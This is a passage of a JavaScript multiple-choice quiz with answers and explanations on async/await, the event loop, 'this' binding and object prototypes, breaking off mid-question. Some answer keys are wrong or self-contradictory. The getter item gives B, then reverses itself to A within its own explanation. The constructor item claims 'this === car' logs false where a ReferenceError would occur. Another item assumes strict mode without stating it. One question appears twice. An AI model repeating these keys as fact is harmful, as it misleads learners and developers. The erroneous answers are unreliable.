## Q. A developer handles async errors. What does this print?

```javascript
async function getUser(id) {
  if (id < 0) throw new Error("Invalid ID");
  return { id, name: "Alice" };
}

async function run() {
  try {
    const user = await getUser(-1);
    console.log(user.name);
  } catch (e) {
    console.log("Error:", e.message);
  }
}

run();
```

- A) `"Alice"`
- B) `"Error: Invalid ID"`
- C) Unhandled Promise Rejection
- D) `undefined`

**Answer: B) `"Error: Invalid ID"`**

**Explanation:** `async` functions that `throw` return a rejected promise. `await` unwraps the rejection and throws it, which is caught by the `try...catch`. This is the idiomatic way to handle async errors.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `async/await` return by default?

```javascript
async function add(a, b) {
  return a + b;
}

const result = add(2, 3);
console.log(result instanceof Promise);
console.log(typeof result.then);
result.then(v => console.log('value:', v));
```

- A) `false`, `"undefined"`, `"value: 5"`
- B) `true`, `"function"`, `"value: 5"`
- C) `false`, `"function"`, `"value: 5"`
- D) `true`, `"function"`, `"value: undefined"`

**Answer: B) `true`, `"function"`, `"value: 5"`**

**Explanation:** Every `async` function always returns a `Promise`, regardless of what the body returns. A plain `return value` is automatically wrapped in `Promise.resolve(value)`. The returned `result` is a Promise with `.then` method. Awaiting it yields `5`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when `await` is used on a non-Promise value?

```javascript
async function test() {
  const x = await 42;
  const y = await 'hello';
  const z = await null;
  return [x, y, z];
}
test().then(console.log);
```

- A) Throws `TypeError` — can only await Promises
- B) `[42, 'hello', null]` — non-Promise values are wrapped in `Promise.resolve()`
- C) `[undefined, undefined, undefined]`
- D) `[Promise, Promise, Promise]`

**Answer: B) `[42, 'hello', null]` — non-Promise values are wrapped in `Promise.resolve()`**

**Explanation:** `await` wraps any non-thenable value in `Promise.resolve()`. `await 42` is equivalent to `await Promise.resolve(42)` and yields `42`. This makes `await` safe to use with any value — Promise or not.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the issue with sequential awaits in a loop?

```javascript
async function processAll(items) {
  const results = [];
  for (const item of items) {
    const result = await processItem(item); // assume ~100ms each
    results.push(result);
  }
  return results;
}
// vs.
async function processAllFast(items) {
  return Promise.all(items.map(item => processItem(item)));
}
```

For 10 items of 100ms each, which is faster?

- A) Both take ~100ms — JS is parallel
- B) `processAll` takes ~1000ms; `processAllFast` takes ~100ms
- C) `processAll` takes ~100ms; `processAllFast` causes race conditions
- D) Both take ~1000ms — JavaScript is single-threaded

**Answer: B) `processAll` takes ~1000ms; `processAllFast` takes ~100ms**

**Explanation:** `await` in a loop processes items **sequentially** (one after another) — 10 × 100ms = ~1000ms. `Promise.all` starts **all** async operations simultaneously and resolves when all complete — ~100ms. Use `Promise.all` for independent operations. Sequential `await` is only needed when each operation depends on the previous result.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `await` do to error propagation?

```javascript
async function fetchUser() {
  throw new Error('Network error');
}

async function loadDashboard() {
  try {
    const user = await fetchUser();
    console.log('user loaded');
  } catch (e) {
    console.log('caught in loadDashboard:', e.message);
  }
}

loadDashboard();
```

- A) The error is uncaught — thrown errors from called functions don\'t propagate through await
- B) `"user loaded"` — async errors are silently ignored
- C) `"caught in loadDashboard: Network error"`
- D) Unhandled promise rejection

**Answer: C) `"caught in loadDashboard: Network error"`**

**Explanation:** `await` converts promise rejections into thrown exceptions, making them catchable by `try...catch`. Even though `fetchUser` is an `async` function (returns a rejected promise), `await fetchUser()` throws the rejection reason synchronously within the async function. The `catch` block handles it.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `async/await` interact with `for...of` for serial async operations?

```javascript
async function main() {
  const nums = [1, 2, 3];
  const results = [];
  for await (const val of nums.map(n => Promise.resolve(n * 2))) {
    results.push(val);
  }
  console.log(results);
}
main();
```

- A) `[2, 4, 6]`
- B) `[Promise, Promise, Promise]`
- C) Throws `TypeError` — `for await` only works with async iterables
- D) `[undefined, undefined, undefined]`

**Answer: A) `[2, 4, 6]`**

**Explanation:** `for await...of` iterates over async iterables (or regular iterables of Promises). It awaits each yielded value. Here the iterable is an array of Promises, each resolving to `n * 2`. The result is `[2, 4, 6]`. It\'s equivalent to a `for...of` loop with `await` inside, but also works with `AsyncIterator` objects like async generators or Node.js streams.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is a common async/await pitfall with `forEach`?

```javascript
async function processItems() {
  const items = [1, 2, 3];
  items.forEach(async (item) => {
    const result = await Promise.resolve(item * 2);
    console.log(result);
  });
  console.log('done');
}
processItems();
```

- A) `2`, `4`, `6`, then `"done"`
- B) `"done"`, then `2`, `4`, `6`
- C) `"done"` only — async callbacks inside `forEach` are ignored
- D) `TypeError` — async not allowed in forEach callback

**Answer: B) `"done"`, then `2`, `4`, `6`**

**Explanation:** `Array.forEach` does not await async callbacks. Each async callback returns a Promise, but `forEach` ignores it. So `"done"` is logged before the awaited results. Use `for...of` with `await` or `Promise.all(items.map(async ...))` when you need to await all callbacks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does top-level `await` allow in ES modules?

```javascript
// In an ES module (.mjs or type="module")
const response = await fetch('/api/config');
const config = await response.json();
export default config;
```

- A) `SyntaxError` — `await` can only be used inside `async` functions
- B) Valid ES2022+ top-level await — the module pauses execution until the awaited Promise resolves
- C) `await` works but `config` will be `undefined`
- D) Valid only in Node.js, not in browsers

**Answer: B) Valid ES2022+ top-level await — the module pauses execution until the awaited Promise resolves**

**Explanation:** Top-level `await` (ES2022) allows using `await` at the top level of ES modules without wrapping in an `async` function. The module execution pauses at the `await`, and importing modules wait for the exporting module to fully initialize. This is useful for dynamic configuration loading or database connections at module startup.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `async/await` with `Promise.race` produce for a timeout pattern?

```javascript
function timeout(ms) {
  return new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Timeout')), ms)
  );
}

async function fetchWithTimeout(url, ms) {
  try {
    return await Promise.race([
      fetch(url),
      timeout(ms)
    ]);
  } catch (e) {
    return `Failed: ${e.message}`;
  }
}
```

What is the purpose of this pattern?

- A) Retry failed fetches automatically
- B) Add a maximum wait time for the fetch — if it takes longer than `ms`, reject with Timeout
- C) Run the fetch and timeout in parallel and use whichever resolves first
- D) Both B and C — they describe the same behavior

**Answer: D) Both B and C — they describe the same behavior**

**Explanation:** `Promise.race` resolves/rejects with the first settled promise. If `fetch` completes before `ms` milliseconds, it wins. If the timeout resolves first, it rejects with `"Timeout"`. The `catch` returns a descriptive string. This pattern effectively enforces a max wait time — implementing both a timeout and parallel execution.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the execution order with multiple awaits?

```javascript
async function foo() {
  console.log('foo start');
  await Promise.resolve();
  console.log('foo end');
}

async function bar() {
  console.log('bar start');
  await foo();
  console.log('bar end');
}

bar();
console.log('sync');
```

- A) `"bar start"`, `"foo start"`, `"foo end"`, `"bar end"`, `"sync"`
- B) `"bar start"`, `"foo start"`, `"sync"`, `"foo end"`, `"bar end"`
- C) `"sync"`, `"bar start"`, `"foo start"`, `"foo end"`, `"bar end"`
- D) `"bar start"`, `"sync"`, `"foo start"`, `"foo end"`, `"bar end"`

**Answer: B) `"bar start"`, `"foo start"`, `"sync"`, `"foo end"`, `"bar end"`**

**Explanation:** `bar()` runs synchronously until its first `await` (which is `foo()`). `foo()` runs synchronously until its first `await` → suspension. Control returns to `bar()` which suspends (awaiting `foo()`). Then `"sync"` logs. Microtask queue: `foo` resumes → `"foo end"` → `foo` resolves → `bar` resumes → `"bar end"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 16. Event Loop

<br>

## Q. What is the exact order of the console output?

```javascript
console.log("1");

setTimeout(() => console.log("2"), 0);

Promise.resolve().then(() => console.log("3"));

console.log("4");
```

- A) `1`, `2`, `3`, `4`
- B) `1`, `4`, `2`, `3`
- C) `1`, `4`, `3`, `2`
- D) `1`, `3`, `4`, `2`

**Answer: C) `1`, `4`, `3`, `2`**

**Explanation:** Synchronous code runs first: `"1"`, `"4"`. Then the **microtask queue** (Promises) runs before the **macrotask queue** (setTimeout). So `"3"` (Promise) runs before `"2"` (setTimeout with 0ms delay).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer is debugging a performance issue. What is the output of this nested timer code?

```javascript
setTimeout(() => {
  console.log("timeout 1");
  Promise.resolve().then(() => console.log("microtask inside timeout"));
}, 0);

setTimeout(() => console.log("timeout 2"), 0);
```

- A) `"timeout 1"`, `"timeout 2"`, `"microtask inside timeout"`
- B) `"timeout 1"`, `"microtask inside timeout"`, `"timeout 2"`
- C) `"microtask inside timeout"`, `"timeout 1"`, `"timeout 2"`
- D) `"timeout 2"`, `"timeout 1"`, `"microtask inside timeout"`

**Answer: B) `"timeout 1"`, `"microtask inside timeout"`, `"timeout 2"`**

**Explanation:** After each macrotask (setTimeout callback), the engine processes **all pending microtasks** before picking the next macrotask. So after `"timeout 1"`, the microtask queue is drained (`"microtask inside timeout"`), then `"timeout 2"` runs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. `this` Keyword — A developer uses `bind`, `call`, and `apply`. What are the outputs?

```javascript
function introduce(greeting, punctuation) {
  return `${greeting}, I'm ${this.name}${punctuation}`;
}

const person = { name: "Alice" };

console.log(introduce.call(person, "Hello", "!"));
console.log(introduce.apply(person, ["Hi", "?"]));

const bound = introduce.bind(person, "Hey");
console.log(bound("..."));
```

- A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`
- B) `"Hello, I'm undefined!"`, `"Hi, I'm undefined?"`, `"Hey, I'm undefined..."`
- C) `TypeError` on all three
- D) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `TypeError`

**Answer: A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`**

**Explanation:** `.call(ctx, arg1, arg2)` invokes immediately with individual args. `.apply(ctx, [args])` invokes immediately with an array. `.bind(ctx, arg1)` returns a new function with `this` and first argument pre-filled (partial application).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to inside a `setTimeout` callback?

```javascript
const obj = {
  name: 'Timer',
  start() {
    setTimeout(function() {
      console.log(this.name); // regular function
    }, 0);
    setTimeout(() => {
      console.log(this.name); // arrow function
    }, 0);
  }
};
obj.start();
```

- A) `"Timer"`, `"Timer"`
- B) `undefined`, `"Timer"`
- C) `"Timer"`, `undefined`
- D) Both log `undefined`

**Answer: B) `undefined`, `"Timer"`**

**Explanation:** A regular function in `setTimeout` is called with `this` set to the global object (or `undefined` in strict mode) — not `obj`. An arrow function captures the `this` from the enclosing lexical context (`obj.start()`\'s `this`, which is `obj`). Arrow functions are the idiomatic solution for preserving `this` in callbacks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to in a standalone function call?

```javascript
function showThis() {
  console.log(this);
}

function strictThis() {
  'use strict';
  console.log(this);
}

showThis();
strictThis();
```

- A) Both log `undefined`
- B) `showThis` logs the global object; `strictThis` logs `undefined`
- C) Both log the global object
- D) Both throw `TypeError`

**Answer: B) `showThis` logs the global object; `strictThis` logs `undefined`**

**Explanation:** In sloppy mode, a standalone function call sets `this` to the global object (`window` in browsers, `global` in Node.js). In strict mode, `this` is `undefined` for standalone calls. Arrow functions, unlike regular functions, don\'t have their own `this` binding at all.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `this` behave in a class method versus a detached method?

```javascript
class Counter {
  constructor() { this.count = 0; }
  increment() { return ++this.count; }
}

const c = new Counter();
console.log(c.increment()); // method call

const { increment } = c;
try {
  console.log(increment()); // detached call
} catch (e) {
  console.log('Error:', e.constructor.name);
}
```

- A) `1`, `2`
- B) `1`, `Error: TypeError`
- C) `1`, `NaN`
- D) `1`, `undefined`

**Answer: B) `1`, `Error: TypeError`**

**Explanation:** Class bodies are always in strict mode. When `increment` is called as a method on `c`, `this` is `c`. When destructured and called as a standalone function, `this` is `undefined` (strict mode). Accessing `undefined.count` throws `TypeError`. Fix: bind in constructor — `this.increment = this.increment.bind(this)` — or use an arrow class field.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to in a constructor when called with `new`?

```javascript
function Person(name) {
  this.name = name;
  this.greet = function() { return `Hello, ${this.name}`; };
}

const alice = new Person('Alice');
const bob = { name: 'Bob', greet: alice.greet };

console.log(alice.greet());
console.log(bob.greet());
```

- A) `"Hello, Alice"`, `"Hello, Alice"`
- B) `"Hello, Alice"`, `"Hello, Bob"`
- C) `"Hello, Alice"`, `"Hello, undefined"`
- D) Both log `"Hello, undefined"`

**Answer: B) `"Hello, Alice"`, `"Hello, Bob"`**

**Explanation:** When called with `new`, `this` inside the constructor refers to the newly created object. `alice.greet()` — `this` is `alice`. When `greet` is assigned to `bob` and called as `bob.greet()`, `this` is `bob`. The method\'s `this` is determined by the **call site**, not where the method was defined.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `bind` create a permanently bound `this`?

```javascript
const module = {
  x: 42,
  getX: function() { return this.x; }
};

const detached = module.getX;
const bound = module.getX.bind(module);

console.log(detached()); // sloppy mode: global.x
console.log(bound());
console.log(bound.call({ x: 99 })); // can you override bind?
```

- A) `undefined`, `42`, `99`
- B) `undefined`, `42`, `42`
- C) `42`, `42`, `99`
- D) `42`, `42`, `42`

**Answer: B) `undefined`, `42`, `42`**

**Explanation:** `detached()` — `this` is global (no `x` → `undefined`). `bound()` — permanently bound to `module`, returns `42`. Importantly, `.call()` **cannot** override a bound function\'s `this` — `.bind()` creates a function with a hardcoded `this` that ignores subsequent `.call()/.apply()/.bind()` attempts.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is `this` in an arrow function defined inside a method?

```javascript
const obj = {
  value: 10,
  outer() {
    const inner = () => this.value;
    return inner();
  },
  wrong: () => this.value
};

console.log(obj.outer());
console.log(obj.wrong());
```

- A) `10`, `10`
- B) `10`, `undefined`
- C) `undefined`, `10`
- D) Both `undefined`

**Answer: B) `10`, `undefined`**

**Explanation:** `inner` is an arrow function defined inside `outer` method — it captures `outer`\'s `this`, which is `obj`. So `inner()` returns `10`. `wrong` is an arrow function defined directly in the object literal — the enclosing lexical context is the module/global scope where `this` is `undefined` (strict) or global.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to in a getter/setter?

```javascript
const circle = {
  radius: 5,
  get area() {
    return Math.PI * this.radius ** 2;
  }
};

const { area } = circle; // destructuring the getter
console.log(circle.area.toFixed(2));
try {
  console.log(area);
} catch(e) {
  console.log('Error');
}
```

- A) `"78.54"`, `"78.54"`
- B) `"78.54"`, `NaN`
- C) `"78.54"`, `Error`
- D) `NaN`, `NaN`

**Answer: B) `"78.54"`, `NaN`**

**Explanation:** `circle.area` invokes the getter with `this = circle` → `Math.PI * 25 ≈ 78.54`. When you destructure a getter with `const { area } = circle`, you get the **current value** (a number), not the getter function. So `area` is `78.54` and `area` (the variable) equals that number — no error, but `NaN` wouldn\'t occur. Actually, `area` is `78.54`, not NaN. The correct answer is A.

**Correction — Answer: A) `"78.54"`, `"78.54"`**

**Explanation:** Destructuring `{ area }` from an object with a getter evaluates the getter immediately and stores the **result** (a number) in `area`. Both `circle.area.toFixed(2)` and the local `area` variable contain the same numeric value. Unlike methods, getters return values — not functions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does a fluent/chained API preserve `this`?

```javascript
class Builder {
  constructor() { this.items = []; }
  add(item) { this.items.push(item); return this; }
  build() { return this.items.join(', '); }
}

const result = new Builder()
  .add('a')
  .add('b')
  .add('c')
  .build();

console.log(result);
```

- A) `TypeError` — methods don\'t return `this`
- B) `"a, b, c"`
- C) `["a","b","c"]`
- D) `"c"` — only last item

**Answer: B) `"a, b, c"`**

**Explanation:** The fluent/builder pattern works by returning `this` from each method. `add` pushes to `this.items` and returns `this` (the same `Builder` instance). Each chained `.add()` call operates on the same object. Finally, `.build()` joins the collected items. This pattern is used in libraries like jQuery, Lodash chains, and query builders.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to in an event handler?

```javascript
class Button {
  constructor(label) {
    this.label = label;
  }
  handleClick() {
    console.log(`Clicked: ${this.label}`);
  }
}

const btn = new Button('Submit');
// Simulating: element.addEventListener('click', btn.handleClick)
const handler = btn.handleClick;
handler(); // called without context
btn.handleClick(); // called as method
```

- A) Both log `"Clicked: Submit"`
- B) `"Clicked: undefined"`, then `"Clicked: Submit"`
- C) `TypeError`, then `"Clicked: Submit"`
- D) `"Clicked: Submit"`, then `"Clicked: undefined"`

**Answer: C) `TypeError`, then `"Clicked: Submit"`**

**Explanation:** When `handler()` is called as a standalone function in class (strict mode), `this` is `undefined`. Accessing `undefined.label` throws `TypeError`. In DOM event listeners, `this` defaults to the element — not the class instance. Fix: `element.addEventListener('click', btn.handleClick.bind(btn))` or use an arrow class field: `handleClick = () => {...}`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to with explicit binding using `.call`?

```javascript
function introduce(greeting, punctuation) {
  return `${greeting}, I'm ${this.name}${punctuation}`;
}

const person = { name: 'Alice' };
console.log(introduce.call(person, 'Hello', '!'));
console.log(introduce.apply(person, ['Hi', '?']));
const boundIntro = introduce.bind(person, 'Hey');
console.log(boundIntro('...'));
```

- A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`
- B) `"Hello, I'm undefined!"`, `"Hi, I'm undefined?"`, `"Hey, I'm undefined..."`
- C) All three throw `TypeError`
- D) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `TypeError`

**Answer: A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`**

**Explanation:** `.call(ctx, arg1, arg2)` invokes with explicit `this`. `.apply(ctx, [args])` takes arguments as array. `.bind(ctx, arg1)` returns a new function (partial application) — `boundIntro` already has `'Hey'` as first arg, only needs `'...'`. All three set `this` to `person`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 17. this Keyword 

<br>

## Q. What does `this` refer to in a method shorthand inside an object literal?

```javascript
const user = {
  name: 'Alice',
  getName() { return this.name; },
  getNameArrow: () => this.name
};
console.log(user.getName());
console.log(user.getNameArrow());
```

- A) `"Alice"`, `"Alice"`
- B) `"Alice"`, `undefined`
- C) `undefined`, `"Alice"`
- D) Both `undefined`

**Answer: B) `"Alice"`, `undefined`**

**Explanation:** Method shorthands (`getName()`) have their own `this` binding — when called as `user.getName()`, `this` is `user`. Arrow functions (`getNameArrow: () => ...`) capture `this` from the surrounding lexical context at definition time — the module/global scope where `this.name` is `undefined`. Never use arrow functions as object methods when you need `this`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `new` affect `this` binding?

```javascript
function Car(model) {
  this.model = model;
  console.log(this === car); // inside constructor
}
const car = new Car('Tesla');
console.log(car.model);
```

- A) `true`, `"Tesla"`
- B) `false`, `"Tesla"`
- C) `undefined`, `"Tesla"`
- D) `true`, `undefined`

**Answer: B) `false`, `"Tesla"`**

**Explanation:** When `new Car('Tesla')` is called, a new empty object is created, `this` is set to that object, and the constructor runs. At the time `console.log(this === car)` runs inside the constructor, `car` hasn\'t been assigned yet (the constructor is still executing) — `car` is `undefined`, so `this === undefined` is `false`. After construction, `car` refers to the new object with `model: "Tesla"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the `this` binding priority order in JavaScript?

- A) Arrow > `new` > explicit (call/apply/bind) > implicit (method call) > default
- B) `new` > explicit (call/apply/bind) > implicit (method call) > default > arrow (no binding)
- C) Explicit (call/apply/bind) > `new` > implicit > default > arrow
- D) Default > implicit > explicit > `new` > arrow

**Answer: B) `new` > explicit (call/apply/bind) > implicit (method call) > default > arrow (no binding)**

**Explanation:** `this` binding priority (highest to lowest): 1) **`new`** — creates a new object. 2) **Explicit** (`.call/.apply/.bind`) — overrides everything except `new`. 3) **Implicit** (method call: `obj.method()`) — `this` is the object. 4) **Default** (standalone call) — global or `undefined` in strict. Arrow functions don\'t have their own `this` — they always inherit from lexical scope.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to when a method is passed as a callback?

```javascript
class Logger {
  constructor(prefix) { this.prefix = prefix; }
  log(msg) { console.log(`${this.prefix}: ${msg}`); }
}

const logger = new Logger('[INFO]');
['a', 'b', 'c'].forEach(logger.log); // passed as callback
['a', 'b', 'c'].forEach(logger.log.bind(logger)); // bound
```

- A) Both work the same: `"[INFO]: a"`, etc.
- B) First throws `TypeError`; second logs `"[INFO]: a"`, `"[INFO]: b"`, `"[INFO]: c"`
- C) First logs `"undefined: a"`, etc.; second logs `"[INFO]: a"`, etc.
- D) First logs `"undefined: a"`, etc.; second throws `TypeError`

**Answer: B) First throws `TypeError`; second logs `"[INFO]: a"`, `"[INFO]: b"`, `"[INFO]: c"`**

**Explanation:** `logger.log` passed as a callback loses its `this` context. In class (strict mode), `this` becomes `undefined` → `this.prefix` throws `TypeError`. `.bind(logger)` creates a new function permanently bound to `logger`, so `this.prefix` is `"[INFO]"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the `this` value in a class static method?

```javascript
class MathUtils {
  constructor() { this.value = 42; }
  
  static square(n) {
    return n * n;
  }
  
  static describe() {
    return `I am ${this.name}`; // what is this.name?
  }
}

console.log(MathUtils.describe());
console.log(MathUtils.square(5));
```

- A) `"I am undefined"`, `25`
- B) `"I am MathUtils"`, `25`
- C) `TypeError`, `25`
- D) `"I am "`, `25`

**Answer: B) `"I am MathUtils"`, `25`**

**Explanation:** In a static method, `this` refers to the **class itself** (the constructor function), not an instance. `this.name` on a function/class is its name string → `"MathUtils"`. Static methods are called on the class, so `this` is the class. Instance properties (like `this.value`) are not accessible from static methods.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` refer to in a prototype method vs own method?

```javascript
function Animal(sound) {
  this.sound = sound;
  this.makeOwnSound = function() { return this.sound; };
}
Animal.prototype.makeProtoSound = function() { return this.sound; };

const cat = new Animal('meow');
const { makeOwnSound, makeProtoSound } = cat;

console.log(makeOwnSound());
console.log(makeProtoSound());
```

- A) `"meow"`, `"meow"`
- B) `undefined`, `undefined`
- C) `TypeError`, `TypeError`
- D) `undefined`, `TypeError`

**Answer: C) `TypeError`, `TypeError`**

**Explanation:** Both methods are regular functions. When destructured and called as standalone functions in strict mode, `this` is `undefined`. Both will throw `TypeError: Cannot read properties of undefined (reading 'sound')`. The distinction between own vs prototype methods doesn\'t change `this` binding behavior — binding is determined by **call site**, not definition location.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `this` resolve to in a private class field method?

```javascript
class BankAccount {
  #balance = 0;
  
  deposit(amount) {
    this.#balance += amount;
    return this;
  }
  
  getBalance() {
    return this.#balance;
  }
}

const account = new BankAccount();
account.deposit(100).deposit(50);
console.log(account.getBalance());
```

- A) `TypeError` — private fields can\'t be accessed with `this`
- B) `150`
- C) `0`
- D) `undefined`

**Answer: B) `150`**

**Explanation:** Private fields (`#balance`) are scoped to the class and accessed via `this.#field`. `deposit` uses the fluent pattern — `return this` allows chaining. After `deposit(100)`, `#balance = 100`. After `deposit(50)`, `#balance = 150`. `this` in `deposit` and `getBalance` refers to the instance (called as methods).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does implicit `this` loss look like in a real callback scenario?

```javascript
const counter = {
  count: 0,
  increment: function() { this.count++; },
  start: function() {
    setInterval(this.increment, 1000);
  }
};
counter.start();
setTimeout(() => console.log(counter.count), 3500);
```

- A) Logs `3`
- B) Logs `0` — `this.increment` inside `setInterval` loses `this` context
- C) Logs `3500`
- D) `TypeError`

**Answer: B) Logs `0` — `this.increment` inside `setInterval` loses `this` context**

**Explanation:** `this.increment` is passed to `setInterval` as a **reference** — when called by the browser timer, `this` is the global object (or `undefined` in strict mode), not `counter`. So `this.count++` increments `window.count`, not `counter.count`. Fix: `setInterval(() => this.increment(), 1000)` or `setInterval(this.increment.bind(this), 1000)`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `this` behave inside a class field arrow function?

```javascript
class Timer {
  delay = 100;
  
  tick = () => {
    console.log(`tick after ${this.delay}ms`);
  }
  
  start() {
    setTimeout(this.tick, this.delay);
  }
}

new Timer().start();
```

- A) `TypeError` — arrow functions cannot be class fields
- B) `"tick after undefinedms"` — `this` is lost in setTimeout
- C) `"tick after 100ms"` — arrow class fields preserve `this`
- D) `"tick after 0ms"` — timeout fires immediately

**Answer: C) `"tick after 100ms"` — arrow class fields preserve `this`**

**Explanation:** Arrow class fields create a new function **per instance** with `this` permanently bound to the instance. Unlike prototype methods, they're not on `Timer.prototype` — they're set in the constructor. This means `this.tick` can safely be passed as a callback without `.bind()`. This is the modern preferred pattern for event handlers in React and similar frameworks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when a `super` method uses `this`?

```javascript
class Animal {
  constructor(name) { this.name = name; }
  describe() { return `I am ${this.name}`; }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);
    this.breed = breed;
  }
  describe() {
    return `${super.describe()}, a ${this.breed}`;
  }
}

const d = new Dog('Rex', 'Labrador');
console.log(d.describe());
```

- A) `"I am Rex, a Labrador"`
- B) `"I am undefined, a Labrador"`
- C) `TypeError` — `super.describe()` cannot access `this`
- D) `"I am Rex"` — `super.describe()` stops at Animal

**Answer: A) `"I am Rex, a Labrador"`**

**Explanation:** `super.describe()` calls the parent class method, but `this` inside that parent method still refers to the **current instance** (`d`). So `this.name` in `Animal.describe()` resolves to `'Rex'` from the `Dog` instance. `super` determines which method to call, not which `this` to use.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 18. Objects & Prototypes

<br>

## Q. A developer inspects the prototype chain. What does the following output?

```javascript
function Animal(name) {
  this.name = name;
}
Animal.prototype.speak = function() {
  return `${this.name} makes a noise.`;
};

const dog = new Animal("Rex");
console.log(dog.speak());
console.log(dog.hasOwnProperty("speak"));
console.log(dog.hasOwnProperty("name"));
```

- A) `"Rex makes a noise."`, `true`, `true`
- B) `"Rex makes a noise."`, `false`, `true`
- C) `"Rex makes a noise."`, `true`, `false`
- D) `undefined`, `false`, `true`

**Answer: B) `"Rex makes a noise."`, `false`, `true`**

**Explanation:** `speak` is on `Animal.prototype`, not on `dog` directly — so `hasOwnProperty("speak")` is `false`. `name` is set by the constructor on the instance itself — so `hasOwnProperty("name")` is `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.create` produce?

```javascript
const base = {
  greet() { return `Hello, ${this.name}`; }
};

const child = Object.create(base);
child.name = "Bob";

console.log(child.greet());
console.log(Object.getPrototypeOf(child) === base);
```

- A) `TypeError`, `false`
- B) `"Hello, Bob"`, `true`
- C) `"Hello, undefined"`, `true`
- D) `"Hello, Bob"`, `false`

**Answer: B) `"Hello, Bob"`, `true`**

**Explanation:** `Object.create(base)` creates a new object whose prototype is `base`. The `greet` method is inherited via the prototype chain. `Object.getPrototypeOf(child) === base` confirms this.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.assign` do with nested objects?

```javascript
const original = { a: 1, b: { c: 2 } };
const copy = Object.assign({}, original);
copy.a = 99;
copy.b.c = 99;

console.log(original.a, original.b.c);
```

- A) `1`, `2` — Object.assign creates a deep copy
- B) `1`, `99` — Object.assign creates a shallow copy (nested objects are shared)
- C) `99`, `99` — primitive properties are also shared
- D) `99`, `2`

**Answer: B) `1`, `99` — Object.assign creates a shallow copy (nested objects are shared)**

**Explanation:** `Object.assign` performs a **shallow copy** — primitive values are copied by value, but nested objects are copied by reference. `copy.a = 99` only affects `copy` (primitives are value-copied). `copy.b.c = 99` mutates the shared `b` object, affecting both `copy` and `original`. Use `structuredClone()` or `JSON.parse(JSON.stringify())` for deep copies.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.freeze` prevent?

```javascript
const config = Object.freeze({ host: 'localhost', port: 3000, db: { name: 'mydb' } });
config.port = 8080;
config.db.name = 'prod';
console.log(config.port, config.db.name);
```

- A) `3000`, `"mydb"` — freeze prevents all mutations
- B) `8080`, `"prod"` — freeze doesn\'t actually work
- C) `3000`, `"prod"` — freeze is shallow; nested objects are still mutable
- D) Throws `TypeError` on the first mutation attempt

**Answer: C) `3000`, `"prod"` — freeze is shallow; nested objects are still mutable**

**Explanation:** `Object.freeze` prevents adding/removing/modifying **own properties** of the frozen object (silently in sloppy mode, `TypeError` in strict mode). However, it\'s **shallow** — nested objects (`config.db`) are not frozen and remain mutable. For deep freeze, you'd need a recursive function.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.defineProperty` allow that regular assignment doesn\'t?

```javascript
const obj = {};
Object.defineProperty(obj, 'id', {
  value: 42,
  writable: false,
  enumerable: false,
  configurable: false
});

obj.id = 99; // attempt to overwrite
